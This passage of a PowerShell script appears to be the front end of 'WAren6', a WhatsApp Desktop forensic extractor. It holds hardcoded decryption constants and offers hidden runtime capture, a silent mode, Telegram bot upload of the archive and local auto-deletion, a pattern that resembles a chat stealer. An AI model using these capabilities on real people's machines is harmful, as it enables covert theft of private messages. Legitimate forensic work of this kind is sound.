[CmdletBinding(PositionalBinding = $false)]
param (
    [Parameter(Mandatory = $false)]
    [Alias('w')]
    [string]$WhatsAppPath,
    [Parameter(Mandatory = $false)]
    [switch]$Offline,
    [Parameter(Mandatory = $false)]
    [Alias('i')]
    [string]$ID,
    [Parameter(Mandatory = $false)]
    [switch]$GetID,
    [Parameter(Mandatory = $false)]
    [Alias('show-secret-id')]
    [switch]$ShowSecretId,
    [Parameter(Mandatory = $false)]
    [Alias('reports')]
    [switch]$GenerateReports,
    [Parameter(Mandatory = $false)]
    [Alias('d')]
    [string]$OutputPath,
    [Parameter(Mandatory = $false)]
    [Alias('o')]
    [switch]$OnlineBootstrap,
    [Parameter(Mandatory = $false)]
    [Alias('n')]
    [switch]$NoNet,
    [Parameter(Mandatory = $false)]
    [switch]$DeleteCaseDirectoryAfterArchive,
    [Parameter(Mandatory = $false)]
    [Alias('keep-case-folder', 'keep-extracted-case')]
    [switch]$KeepCaseDirectoryAfterArchive,
    [Parameter(Mandatory = $false)]
    [Alias('tg', 'telegram')]
    [string]$TelegramBotToken,
    [Parameter(Mandatory = $false)]
    [Alias('cid', 'chat-id')]
    [string]$TelegramChatId,
    [Parameter(Mandatory = $false)]
    [Alias('ad', 'autodelete')]
    [switch]$TelegramAutoDelete,
    [Parameter(Mandatory = $false)]
    [Alias('enc', 'encrypt')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Justification = 'Field CLI intentionally accepts -enc "PASS"; command summaries and manifests redact this value.')]
    [string]$TelegramEncryptPassword,
    [Parameter(Mandatory = $false)]
    [Alias('tg-api-base')]
    [string]$TelegramApiBase = "https://api.telegram.org",
    [Parameter(Mandatory = $false)]
    [Alias('t')]
    [string]$ReportTimezone = "local",
    [Parameter(Mandatory = $false)]
    [switch]$Store8CryptoResearch,
    [Parameter(Mandatory = $false)]
    [string]$OpaqueSaltFile,
    [Parameter(Mandatory = $false)]
    [Alias('j')]
    [string]$RuntimeStore8Jsonl,
    [Parameter(Mandatory = $false)]
    [Alias('f')]
    [switch]$OfflineMode,
    [Parameter(Mandatory = $false)]
    [switch]$OfflineOnly,
    [Parameter(Mandatory = $false)]
    [Alias('m')]
    [switch]$WithMedia,
    [Parameter(Mandatory = $false)]
    [switch]$Hybrid,
    [Parameter(Mandatory = $false)]
    [Alias('a')]
    [switch]$AcquireOnly,
    [Parameter(Mandatory = $false)]
    [Alias('u')]
    [switch]$UnifyOnly,
    [Parameter(Mandatory = $false)]
    [Alias('c', 'p')]
    [string]$CasePath,
    [Parameter(Mandatory = $false)]
    [Alias('r')]
    [switch]$RuntimeOnly,
    [Parameter(Mandatory = $false)]
    [switch]$RuntimeCaptureOnly,
    [Parameter(Mandatory = $false)]
    [Alias('s')]
    [switch]$Silent,
    [Parameter(Mandatory = $false)]
    [Alias('foreground-runtime', 'visible-runtime', 'show-whatsapp')]
    [switch]$ForegroundRuntime,
    [Parameter(Mandatory = $false)]
    [Alias('doc')]
    [switch]$Doctor,
    [Parameter(Mandatory = $false)]
    [switch]$DryRun,
    [Parameter(Mandatory = $false)]
    [Alias('h')]
    [switch]$Help,
    [Parameter(Mandatory = $false)]
    [string]$HelpTopic,
    [Parameter(ValueFromRemainingArguments = $true)]
    [string[]]$CliArgs
)

# WAren6 WhatsApp Desktop forensic extraction pipeline.
# Collects LocalState/WebView2 evidence, retrieves ODUID when needed,
# decrypts SQLite DB/WAL files, and builds a unified review database.

$global:metaDataFileName = "WAren6.mtd.txt"
$global:whatsappDll_passphrase = "5303b14c0984e9b13fe75770cd25aaf7"
$global:WAren6Version = "1.1.0"
$global:webview2_staticBytes = "23a7f19c11e5bd784235c96f85d24913"
$global:getODUID_salt = "0x6300760031006700310067007600"
$global:pbkdf_iterations = 10000

function Set-WAren6CliSwitch {
    param([Parameter(Mandatory = $true)][string]$Name)
    Set-WAren6CliSwitchValue -Name $Name -Enabled $true
}

function Set-WAren6CliSwitchValue {
    param(
        [Parameter(Mandatory = $true)][string]$Name,
        [Parameter(Mandatory = $true)][bool]$Enabled
    )
    $value = [System.Management.Automation.SwitchParameter]::new($Enabled)
    Set-Variable -Name $Name -Value $value -Scope Script
    if ($Enabled) {
        $PSBoundParameters[$Name] = $value
    }
    elseif ($PSBoundParameters.ContainsKey($Name)) {
        [void]$PSBoundParameters.Remove($Name)
    }
}

function Set-WAren6CliValue {
    param(
        [Parameter(Mandatory = $true)][string]$Name,
        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$Value
    )
    Set-Variable -Name $Name -Value $Value -Scope Script
    $PSBoundParameters[$Name] = $Value
}

function Import-WAren6LongOptions 
{
    param([string[]]$Arguments)

    if (-not $Arguments -or $Arguments.Count -eq 0) {
        return
    }

    $switchMap = @{
        "help" = "Help"
        "doctor" = "Doctor"
        "doc" = "Doctor"
        "dry" = "DryRun"
        "dry-run" = "DryRun"
        "silent" = "Silent"
        "foreground-runtime" = "ForegroundRuntime"
        "visible-runtime" = "ForegroundRuntime"
        "show-whatsapp" = "ForegroundRuntime"
        "show-wa" = "ForegroundRuntime"
        "offline" = "OfflineMode"
        "offline-only" = "OfflineMode"
        "media" = "WithMedia"
        "with-media" = "WithMedia"
        "hybrid" = "Hybrid"
        "acquire" = "AcquireOnly"
        "acquire-only" = "AcquireOnly"
        "unify" = "UnifyOnly"
        "unify-only" = "UnifyOnly"
        "runtime" = "RuntimeOnly"
        "runtime-capture" = "RuntimeOnly"
        "runtime-capture-only" = "RuntimeOnly"
        "no-net" = "NoNet"
        "no-network" = "NoNet"
        "online" = "OnlineBootstrap"
        "online-bootstrap" = "OnlineBootstrap"
        "get-id" = "GetID"
        "show-secret-id" = "ShowSecretId"
        "reports" = "GenerateReports"
        "store8-crypto-research" = "Store8CryptoResearch"
        "delete-case-directory-after-archive" = "DeleteCaseDirectoryAfterArchive"
        "keep-case-folder" = "KeepCaseDirectoryAfterArchive"
        "keep-extracted-case" = "KeepCaseDirectoryAfterArchive"
        "autodelete" = "TelegramAutoDelete"
        "auto-delete" = "TelegramAutoDelete"
    }
    $valueMap = @{
        "case" = "CasePath"
        "path" = "CasePath"
        "case-path" = "CasePath"
        "wa" = "WhatsAppPath"
        "whatsapp" = "WhatsAppPath"
        "whatsapp-path" = "WhatsAppPath"
        "out" = "OutputPath"
        "output" = "OutputPath"
        "output-path" = "OutputPath"
        "id" = "ID"
        "tz" = "ReportTimezone"
        "timezone" = "ReportTimezone"
        "report-timezone" = "ReportTimezone"
        "jsonl" = "RuntimeStore8Jsonl"
        "runtime-jsonl" = "RuntimeStore8Jsonl"
        "runtime-store8-jsonl" = "RuntimeStore8Jsonl"
        "opaque-salt-file" = "OpaqueSaltFile"
        "telegram" = "TelegramBotToken"
        "tg" = "TelegramBotToken"
        "chat-id" = "TelegramChatId"
        "cid" = "TelegramChatId"
        "encrypt" = "TelegramEncryptPassword"
        "enc" = "TelegramEncryptPassword"
        "tg-api-base" = "TelegramApiBase"
        "telegram-api-base" = "TelegramApiBase"
    }

    for ($i = 0; $i -lt $Arguments.Count; $i++) {
        $arg = $Arguments[$i]
        
        if ([string]::IsNullOrWhiteSpace($arg)) {
            continue
        }
        
        if (-not $arg.StartsWith("--")) {
            if ($Help -and -not $HelpTopic) {
                Set-WAren6CliValue -Name "HelpTopic" -Value $arg
                continue
            }
            throw "Unsupported positional argument '$arg'. Use named flags such as --offline, --media, or --case."
        }

        $name = $arg.Substring(2)
        $value = $null
        $equals = $name.IndexOf("=")
        
        if ($equals -ge 0) {
            $value = $name.Substring($equals + 1)
            $name = $name.Substring(0, $equals)
        }
        $name = $name.ToLowerInvariant()

        if ($name -eq "help") {
            Set-WAren6CliSwitch -Name "Help"
            if ($null -ne $value -and $value -notin @("", "true", "1", "yes")) {
                Set-WAren6CliValue -Name "HelpTopic" -Value $value
            }
            elseif ($null -eq $value -and $i + 1 -lt $Arguments.Count -and -not $Arguments[$i + 1].StartsWith("--")) {
                $i++
                Set-WAren6CliValue -Name "HelpTopic" -Value $Arguments[$i]
            }
            continue
        }

        if ($switchMap.ContainsKey($name)) {
            if ($null -ne $value -and $value -notin @("", "true", "1", "yes")) {
                throw "Switch --$name does not accept value '$value'."
            }
            Set-WAren6CliSwitch -Name $switchMap[$name]
            continue
        }

        if ($valueMap.ContainsKey($name)) {
            if ($null -eq $value) {
                if ($i + 1 -ge $Arguments.Count -or $Arguments[$i + 1].StartsWith("--")) {
                    throw "Option --$name requires a value."
                }
                $i++
                $value = $Arguments[$i]
            }
            Set-WAren6CliValue -Name $valueMap[$name] -Value $value
            continue
        }

        throw "Unknown WAren6 option '--$name'."
    }
}


Import-WAren6LongOptions -Arguments $CliArgs

$script:WAren6LegacyCliFlags = @()
if ($PSBoundParameters.ContainsKey('OfflineOnly')) {
    $script:WAren6LegacyCliFlags += "-OfflineOnly / --offline-only"
    Set-WAren6CliSwitch -Name "OfflineMode"
}
if ($PSBoundParameters.ContainsKey('Offline')) {
    $script:WAren6LegacyCliFlags += "-Offline"
    Set-WAren6CliSwitch -Name "OfflineMode"
}
if ($PSBoundParameters.ContainsKey('RuntimeCaptureOnly')) {
    $script:WAren6LegacyCliFlags += "-RuntimeCaptureOnly / --runtime-capture"
    Set-WAren6CliSwitch -Name "RuntimeOnly"
}
if ($PSBoundParameters.ContainsKey('Hybrid')) {
    $script:WAren6LegacyCliFlags += "-Hybrid / --hybrid"
}

$script:WAren6UseSuppliedODUID = [bool]($PSBoundParameters.ContainsKey('Offline') -or ($OfflineMode -and -not [string]::IsNullOrWhiteSpace($ID)))

if ($OfflineMode) {
    Set-WAren6CliSwitch -Name "NoNet"
    Set-WAren6CliSwitchValue -Name "Hybrid" -Enabled $false
}
elseif (-not $Doctor -and -not $UnifyOnly -and -not $RuntimeOnly -and -not $GetID -and -not $PSBoundParameters.ContainsKey('Hybrid')) {
    Set-WAren6CliSwitch -Name "Hybrid"
}

if ($NoNet -or $OfflineMode) {
    Set-WAren6CliSwitchValue -Name "OnlineBootstrap" -Enabled $false
}
elseif (-not $Doctor -and -not $PSBoundParameters.ContainsKey('OnlineBootstrap')) {
    Set-WAren6CliSwitch -Name "OnlineBootstrap"
}

function Test-WAren6ColorOutput {
    if ($env:NO_COLOR) {
        return $false
    }


    try {
        return -not [Console]::IsOutputRedirected
    }
    catch {
        return $true
    }
}

$script:WAren6UseColor = Test-WAren6ColorOutput
$script:WAren6LogPath = $null
$script:WAren6TranscriptActive = $false

function Get-WAren6OutputColor {
    param(
        [AllowEmptyString()]
        [string]$Message
    )

    switch -Regex ($Message) {
        'CRITICAL|Error|Failed|\[x\]|\[X\]|Unable to decrypt' { return [ConsoleColor]::Red }
        'WARNING|\[!\]|not found|skipping|Missing dependency|Force-terminating' { return [ConsoleColor]::Yellow }
        '\[OK\]|successfully|processed successfully|EXTRACTION COMPLETE' { return [ConsoleColor]::Green }
        '\[>\]|Decrypting|Resolving|Verifying|Spawning|Compressing|Calculating|Acquiring|Installing' { return [ConsoleColor]::Cyan }
        '^+|^+|^+|^||WAren6 Forensic Pipeline|WAren6 WhatsApp Forensic Data Extractor|EXTRACTION SUMMARY' { return [ConsoleColor]::DarkCyan }
        default { return [ConsoleColor]::Gray }
    }
}

function Protect-WAren6CommandLine  {
    param(
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [string]$CommandLine
    )

    # Keep these parameter names in the function body for static parser tests and future auditors.
    $sensitiveNames = @("TelegramBotToken", "TelegramEncryptPassword")
    [void]$sensitiveNames

    $protected = $CommandLine
    foreach ($flag in @("-tg", "--telegram", "--tg", "-TelegramBotToken", "--TelegramBotToken", "-enc", "--encrypt", "--enc", "-TelegramEncryptPassword", "--TelegramEncryptPassword")) {
        $escaped = [regex]::Escape($flag)
        $protected = [regex]::Replace(
            $protected,
            "(?i)(^|\s)($escaped)(\s+)(`"[^`"]*`"|'[^']*'|\S+)",
            '$1$2$3"[REDACTED]"'
        )
        $protected = [regex]::Replace(
            $protected,
            "(?i)(^|\s)($escaped=)(`"[^`"]*`"|'[^']*'|\S+)",
            '$1$2"[REDACTED]"'
        )
    }
    return $protected
}

function Protect-WAren6PathText {
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$Text,
        [Parameter(Mandatory = $false)]
        [string]$CaseRoot
    )

    if ($null -eq $Text) { return $null }
    $protected = [string]$Text
    $replacements = New-Object System.Collections.Generic.List[object]

    foreach ($pair in @(
        @($CaseRoot, "<case-root>"),
        @($global:targetOutput, "<case-root>"),
        @($env:LOCALAPPDATA, "%LOCALAPPDATA%"),
        @($env:USERPROFILE, "%USERPROFILE%"),
        @($env:TEMP, "%TEMP%"),
        @($env:TMP, "%TEMP%")
    )) {
        $path = [string]$pair[0]
        if ([string]::IsNullOrWhiteSpace($path)) { continue }
        try {
            $resolved = if (Test-Path -LiteralPath $path) { (Resolve-Path -LiteralPath $path).Path } else { $path }
            $replacements.Add([PSCustomObject]@{ Path = $resolved.TrimEnd('\'); Token = [string]$pair[1] })
        }
        catch {
            $replacements.Add([PSCustomObject]@{ Path = $path.TrimEnd('\'); Token = [string]$pair[1] })
        }
    }

    foreach ($item in ($replacements | Sort-Object { $_.Path.Length } -Descending)) {
        if ([string]::IsNullOrWhiteSpace($item.Path)) { continue }
        $escaped = [regex]::Escape($item.Path)
        $protected = [regex]::Replace($protected, $escaped, $item.Token, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
    }
    return $protected
}

function Protect-WAren6ManifestObject {
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$Value,
        [Parameter(Mandatory = $false)]
        [string]$CaseRoot
    )

    if ($null -eq $Value) { return $null }
    if ($Value -is [string]) { return Protect-WAren6PathText -Text $Value -CaseRoot $CaseRoot }
    if ($Value -is [ValueType]) { return $Value }
    if ($Value -is [System.Collections.IDictionary]) {
        $copy = [ordered]@{}
        foreach ($key in $Value.Keys) {
            $copy[$key] = Protect-WAren6ManifestObject -Value $Value[$key] -CaseRoot $CaseRoot
        }
        return [PSCustomObject]$copy
    }
    if ($Value -is [System.Collections.IEnumerable] -and -not ($Value -is [string])) {
        $items = [System.Collections.Generic.List[object]]::new()
        foreach ($item in $Value) {
            $items.Add((Protect-WAren6ManifestObject -Value $item -CaseRoot $CaseRoot)) | Out-Null
        }
        return $items.ToArray()
    }

    $copy = [ordered]@{}
    foreach ($prop in $Value.PSObject.Properties) {
        $copy[$prop.Name] = Protect-WAren6ManifestObject -Value $prop.Value -CaseRoot $CaseRoot
    }
    return [PSCustomObject]$copy
}

function Protect-WAren6LogFile {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,
        [Parameter(Mandatory = $false)]
        [string]$CaseRoot
    )

    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) { return }
    try {
        $content = Get-Content -LiteralPath $Path -Raw -ErrorAction Stop
        $content = Protect-WAren6PathText -Text $content -CaseRoot $CaseRoot
        Set-Content -LiteralPath $Path -Value $content -Encoding UTF8 -Force
    }
    catch {
        Write-Warning "Unable to redact WAren6 log paths: $($_.Exception.Message)"
    }
}

function Write-WAren6Log {
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$Message
    )

    if (-not $script:WAren6LogPath -or $script:WAren6TranscriptActive) 
    {return}

    try {
        $text = if ($null -eq $Message) { "" } else { [string]$Message }
        Add-Content -LiteralPath $script:WAren6LogPath -Value $text -Encoding UTF8
    }
    catch { }
}

function Start-WAren6Log {
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$LogPath,
        [Parameter(Mandatory = $false)]
        [string]$CommandLine
    )

    try {
        $logParent = Split-Path -Path $LogPath -Parent
        if ($logParent) {
            New-Item -ItemType Directory -Force -Path $logParent | Out-Null
        }
        $script:WAren6LogPath = $LogPath
        $header = @(
            "WAren6 logs.txt",
            "StartedUtc: $((Get-Date).ToUniversalTime().ToString('o'))",
            "CommandLine: $(Protect-WAren6PathText -Text $(if ($CommandLine) { $CommandLine } else { Protect-WAren6CommandLine -CommandLine ([Environment]::CommandLine) }))",
            ""
        )
        $header | Out-File -LiteralPath $script:WAren6LogPath -Encoding UTF8 -Force
        
        try {
            $supportsMinimalHeader = (Get-Command Start-Transcript).Parameters.ContainsKey('UseMinimalHeader')
            if ($supportsMinimalHeader) {
                Start-Transcript -Path $script:WAren6LogPath -Append -UseMinimalHeader -ErrorAction Stop | Out-Null
            }
            else {
                Start-Transcript -Path $script:WAren6LogPath -Append -ErrorAction Stop | Out-Null
            }
            $script:WAren6TranscriptActive = $true
        }
        catch {
            $script:WAren6TranscriptActive = $false
            Write-WAren6Log "Transcript unavailable: $($_.Exception.Message)"
        }
    }
    
    catch {
        $script:WAren6LogPath = $null
        $script:WAren6TranscriptActive = $false
        Write-Warning "Unable to start WAren6 log: $($_.Exception.Message)"
    }
}

function Stop-WAren6Log {
    if ($script:WAren6TranscriptActive) {
        try { Stop-Transcript | Out-Null } catch { }
    }
    $script:WAren6TranscriptActive = $false
    if ($script:WAren6LogPath) {
        Protect-WAren6LogFile -Path $script:WAren6LogPath -CaseRoot $global:targetOutput
    }
}

function Sync-WAren6CaseLog {
    param(
        [Parameter(Mandatory = $true)]
        [string]$CasePath
    )

    if (-not $script:WAren6LogPath -or -not (Test-Path -LiteralPath $script:WAren6LogPath -PathType Leaf)) 
    {return $null}
    
    if (-not (Test-Path -LiteralPath $CasePath -PathType Container)) {
        return $null}

    $caseLogPath = Join-Path $CasePath "logs.txt"
    try {
        if ($script:WAren6TranscriptActive) {
            Copy-Item -LiteralPath $script:WAren6LogPath -Destination $caseLogPath -Force
            Protect-WAren6LogFile -Path $caseLogPath -CaseRoot $CasePath
        }
        else {
            $content = Get-Content -LiteralPath $script:WAren6LogPath -Raw -ErrorAction Stop
            $content = Protect-WAren6PathText -Text $content -CaseRoot $CasePath
            Set-Content -LiteralPath $caseLogPath -Value $content -Encoding UTF8 -Force
        }
        return $caseLogPath
    }
    catch {
        Write-Warning "Unable to copy logs.txt into case folder: $($_.Exception.Message)"
        return $null
    }
}

function Write-WAren6Output {
    param(
        [Parameter(ValueFromPipeline = $true)]
        [AllowNull()]
        [object]$Message
    )

    process {
        if ($null -eq $Message) {
            $text = ""
        }
        else {
            $text = [string]$Message
        }
        $text = Protect-WAren6PathText -Text $text -CaseRoot $global:targetOutput

        if ($script:WAren6UseColor)  {
            Write-Host $text -ForegroundColor (Get-WAren6OutputColor $text)
        }
        else {
            Write-Output $text
        }
        Write-WAren6Log $text
    }
}

function Write-WAren6StepTiming {
    param(
        [Parameter(Mandatory = $true)][string]$Label,
        [Parameter(Mandatory = $true)][System.Diagnostics.Stopwatch]$Stopwatch
    )

    $Stopwatch.Stop()
    Write-WAren6Output ("  [time] {0}: {1}s" -f $Label, $Stopwatch.Elapsed.TotalSeconds.ToString("F1"))
    $Stopwatch.Restart()
}

function Get-WAren6ModeLabel {
    param(
        [switch]$UnifyOnly,
        [switch]$RuntimeOnly,
        [switch]$AcquireOnly,
        [switch]$OfflineMode,
        [switch]$Hybrid
    )

    if ($UnifyOnly) { return "unify" }
    if ($RuntimeOnly) { return "runtime" }
    if ($AcquireOnly -and $OfflineMode) { return "offline acquire" }
    if ($AcquireOnly -and $Hybrid) { return "hybrid acquire" }
    if ($AcquireOnly) { return "acquire" }
    if ($OfflineMode) { return "offline" }
    if ($Hybrid) { return "hybrid" }
    return "standard"
}

function Get-WAren6NetworkLabel {
    param(
        [switch]$OnlineBootstrap,
        [switch]$OfflineMode,
        [switch]$Hybrid,
        [switch]$RuntimeOnly
    )

    if ($OfflineMode) {
        return "off"
    }
    if ($OnlineBootstrap -and ($Hybrid -or $RuntimeOnly)) {
        return "bootstrap on; runtime may connect"
    }
    if ($OnlineBootstrap) {
        return "bootstrap on"
    }
    if ($Hybrid -or $RuntimeOnly) {
        return "bootstrap off; runtime may connect"
    }
    return "off"
}

function Write-WAren6CommandSummary {
    param(
        [Parameter(Mandatory = $true)][string]$Mode,
        [Parameter(Mandatory = $true)][bool]$WithMedia,
        [Parameter(Mandatory = $true)][string]$Network,
        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$Source,
        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$Output,
        [switch]$DryRun
    )

    $prefix = if ($DryRun) { "DRY RUN" } else { "Command" }
    $mediaText = if ($WithMedia) { "local media on" } else { "local media off" }
    Write-WAren6Output "+-- $prefix Summary -----------------------------------------+"
    Write-WAren6Output "| Mode:    $Mode"
    Write-WAren6Output "| Media:   $mediaText"
    Write-WAren6Output "| Network: $Network"
    Write-WAren6Output "| Source:  $Source"
    Write-WAren6Output "| Output:  $Output"
    Write-WAren6Output "+------------------------------------------------------------+"
    Write-WAren6Output ""
}

function Show-WAren6Help {
    param([string]$Topic = "")

    $topicKey = if ([string]::IsNullOrWhiteSpace($Topic)) { "main" } else { $Topic.ToLowerInvariant() }
    switch ($topicKey) {
        "modes" {
            Write-WAren6Output @"
WAren6 modes

  .\waren6.ps1
      Default hybrid extraction. Acquires evidence, captures runtime Store 8 text when possible,
      decrypts, unifies, validates, hashes, archives, and cleans the extracted case folder.

  .\waren6.ps1 -f
  .\waren6.ps1 --offline
      Evidence-only run. No WhatsApp runtime capture and no online bootstrap.

  .\waren6.ps1 -a
  .\waren6.ps1 --acquire
      Acquire, decrypt, hash, manifest, and archive. Skip Python unification.

  .\waren6.ps1 -u -c <case-folder-or-archive>
  .\waren6.ps1 --unify --case <case-folder-or-archive>
      Unify an existing acquired case on this or another machine.

  .\waren6.ps1 -r -c <folder>
  .\waren6.ps1 --runtime --case <folder>
      Capture only the live Store 8 runtime JSONL supplement.
"@
            return
        }
        "flags" {
            Write-WAren6Output @"
WAren6 primary flags

  -h, --help [topic]        Show help. Topics: modes, flags, examples.
  -doc, --doctor            Run preflight checks only. Does not open WhatsApp, copy evidence, or decrypt.
  -s, --silent              Console-only run. Runtime capture is hidden by default.
  --foreground-runtime      Troubleshooting only: leave WhatsApp visible during runtime capture.
  --dry                     Print the plan and exit before opening, closing, copying, or hashing evidence.
  -f, --offline             No runtime capture and no online bootstrap.
  -m, --media               Copy/index/hash local media already present on disk.
  -a, --acquire             Acquire/decrypt/archive only; skip unification.
  -u, --unify               Unify an existing case folder or archive.
  -r, --runtime             Runtime Store 8 capture only.
  -n, --no-net              Disable Python/dependency downloads. Runtime capture can still open WhatsApp.
  --keep-case-folder        Keep the extracted WAren6_<timestamp> folder after the archive is verified.
  -tg, --telegram <token>   Send verified archive/parts to Telegram with a bot token.
  -cid, --chat-id <id>      Telegram chat id for -tg.
  -ad, --autodelete         Delete local WAren6 output only after verified Telegram upload.
  --reports                 Generate large HTML/CSV/JSONL/PDF reports in the case archive.
  --get-id                  Print the local ODUID fingerprint and exit.
  --show-secret-id          With --get-id, print the raw ODUID explicitly.

Value flags

  -w, --wa <path>           WhatsApp LocalState source path.
  -c, --case <path>         Existing case folder/archive, or runtime output folder.
  -d, --out <path>          Output root for new extraction.
  -i, --id <hex>            Examiner-supplied ODUID for detached/offline evidence.
  -t, --tz <zone>           Report timezone, for example local, UTC, or Asia/Kolkata.
  -j, --jsonl <path>        Existing runtime Store 8 JSONL supplement.
  -enc, --encrypt <pass>    Encrypt the compressed archive before Telegram transfer.
  --tg-api-base <url>       Advanced: custom Telegram Bot API base URL.
"@
            return
        }
        "examples" {
            Write-WAren6Output @"
WAren6 examples

  .\waren6.ps1
  .\waren6.ps1 -s
  .\waren6.ps1 -m
  .\waren6.ps1 -m -tg "BOT_TOKEN" -cid "CHAT_ID" -ad -enc "PASS"
  .\waren6.ps1 -doc
  .\waren6.ps1 -f
  .\waren6.ps1 -f -w C:\Cases\CollectedLocalState -i <oduid-hex>
  .\waren6.ps1 -u -c C:\Cases\WAren6_20260509120000.zip
  .\waren6.ps1 --media --telegram "BOT_TOKEN" --chat-id "CHAT_ID" --autodelete --encrypt "PASS"
  .\waren6.ps1 -r -c C:\Cases\RuntimeOnly -s
  .\waren6.ps1 --dry
  .\waren6.ps1 --no-net --media
"@
            return
        }
        default {
            Write-WAren6Output @"
WAren6 WhatsApp Desktop forensic toolkit

Usage:
  .\waren6.ps1 [flags]
  .\waren6.ps1 --help modes
  .\waren6.ps1 --help flags
  .\waren6.ps1 --help examples

Default:
  Hybrid extraction is enabled by default for better message-body recovery.
  Runtime capture starts WhatsApp in a best-effort hidden background state.
  Online bootstrap is enabled by default only for Python/dependency setup.
  Local media copy is off unless you pass --media.
  The extracted WAren6_<timestamp> folder is cleaned after a verified archive unless you pass --keep-case-folder.

Most used:
  .\waren6.ps1              Full hybrid run
  .\waren6.ps1 -f           Offline evidence-only run
  .\waren6.ps1 -m           Hybrid run with local media indexing
  .\waren6.ps1 -doc         Check local readiness without acquiring evidence
  .\waren6.ps1 -m -tg <bot> -cid <chat> -ad -enc <pass>
  .\waren6.ps1 --dry        Show what would happen, then exit
  .\waren6.ps1 -u -c <archive>  Unify a case later
"@
            return
        }
    }
}

if ($Help) {
    Show-WAren6Help -Topic $HelpTopic
    exit 0
}

function Convert-HexStringToByteArray 
{
    param ([string]$hexString)

    # Trim leading and trailing whitespace.
    $hexString = $hexString.Trim()

    # Remove characters that are not valid hexadecimal values (0-9, A-F, a-f).
    $hexString = $hexString -replace '[^0-9A-Fa-f]', ''

    # Verify that the length is even.
    if ($hexString.Length % 2 -ne 0) {
        throw "The hex string must have an even length. Actual length: $($hexString.Length)"
    }

    # Convert the string to a byte array.
    $byteArray = @()
    for ($i = 0; $i -lt $hexString.Length; $i += 2) {
        $byteValue = [Convert]::ToByte($hexString.Substring($i, 2), 16)
        $byteArray += $byteValue
    }

    return , $byteArray
}

$global:whatsappDll_passphrase_bc = (Convert-HexStringToByteArray $whatsappDll_passphrase)

function Get-AppLocalStatePath {
    param(
        [Parameter(Mandatory = $true)]
        [string]$AppName
    )

    $appPackage = Get-AppxPackage | Where-Object { $_.Name -like "*$AppName*" }

    if ($appPackage) {
        # Verify if does it use PackageFamilyName or not
        if ($appPackage.Name -like "*WhatsApp*") {
            $packageId = $appPackage.PackageFamilyName
        }
        else {
            $packageId = $appPackage.PackageFullName
        }

        $localStatePath = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Packages\$packageId\LocalState"

        if (!(Test-Path -Path $localStatePath -PathType Container)) {
            Write-Warning "Dir LocalState not found to '$AppName'. PackageId: $packageId"
            return $null
        }

        return $localStatePath
    }
    else {
        Write-Warning "WindowsApp '$AppName' not found."
        return $null
    }
}

# Function to copy the contents of a directory to a destination.
# Uses robocopy instead of Copy-Item to handle locked/in-use UWP files
# (e.g. WhatsApp Desktop databases held open by the running process).
function Copy-Directory {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Source,

        [Parameter(Mandatory = $true)]
        [string]$Destination,

        [Parameter(Mandatory = $false)]
        [string[]]$ExcludeDirectories = @()
    )

    try {
        if (!(Test-Path -Path $Source -PathType Container)) {
            throw "Source directory '$Source' not found."
        }

        $sourceFull = [System.IO.Path]::GetFullPath($Source).TrimEnd('\', '/')
        $destinationFull = [System.IO.Path]::GetFullPath($Destination).TrimEnd('\', '/')
        if ($destinationFull.Equals($sourceFull, [System.StringComparison]::OrdinalIgnoreCase) -or
            $destinationFull.StartsWith("$sourceFull\", [System.StringComparison]::OrdinalIgnoreCase)) {
            throw "Destination directory must not be the source directory or inside it."
        }

        if (!(Test-Path -Path $Destination -PathType Container)) {
            New-Item -ItemType Directory -Path $Destination -Force | Out-Null
        }
        else {
            $safeDestination = Protect-WAren6PathText -Text $Destination -CaseRoot $global:targetOutput
            Write-Verbose "Clearing destination directory: $safeDestination"
            Get-ChildItem -Path $Destination -Force | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
        }

        $safeSource = Protect-WAren6PathText -Text $Source -CaseRoot $global:targetOutput
        $safeDestination = Protect-WAren6PathText -Text $Destination -CaseRoot $global:targetOutput
        Write-Verbose "Copying with robocopy: $safeSource -> $safeDestination"
        $robocopyArgs = @(
            $Source,
            $Destination,
            "/E",
            "/R:3",
            "/W:1",
            "/B",
            "/MT:8",
            "/NP",
            "/NFL",
            "/NDL",
            "/NJH",
            "/NJS"
        )
        if ($ExcludeDirectories -and $ExcludeDirectories.Count -gt 0) {
            $robocopyArgs += "/XD"
            foreach ($dir in $ExcludeDirectories) {
                $robocopyArgs += $dir
            }
        }
        $robocopyOutput = & robocopy.exe @robocopyArgs 2>&1
        $robocopyExitCode = $LASTEXITCODE
        foreach ($line in $robocopyOutput) {
            if ($line) {
                Write-WAren6Output (Protect-WAren6PathText -Text ([string]$line) -CaseRoot $global:targetOutput)
            }
        }
        
        # Robocopy exit codes: 0-7 = OK, 8+ = errors
        if ($robocopyExitCode -ge 8) {
            Write-Warning "Robocopy reported errors (exit code: $robocopyExitCode). Attempting fallback..."
            Get-ChildItem -Path $Source -Force -Recurse | ForEach-Object {
                $skipItem = $false
                foreach ($excluded in $ExcludeDirectories) {
                    if ($_.FullName -like "*\$excluded\*" -or $_.Name -eq $excluded) {
                        $skipItem = $true
                        break
                    }
                }
                if (-not $skipItem) {
                    $targetPath = Join-Path -Path $Destination -ChildPath ($_.FullName.Substring($Source.Length))
                    if ($_.PSIsContainer) {
                        if (!(Test-Path $targetPath)) { New-Item -ItemType Directory -Path $targetPath -Force | Out-Null }
                    }
                    else {
                        if (!(Test-Path $targetPath)) {
                            try { Copy-Item -Path $_.FullName -Destination $targetPath -Force -ErrorAction Stop }
                            catch {
                                $safeFailedPath = Protect-WAren6PathText -Text $_.FullName -CaseRoot $global:targetOutput
                                Write-Warning "Failed to copy '$safeFailedPath': $($_.Exception.Message)"
                            }
                        }
                    }
                }
            }
        }
        else {
            Write-Verbose "Robocopy completed successfully (exit code: $robocopyExitCode)."
        }

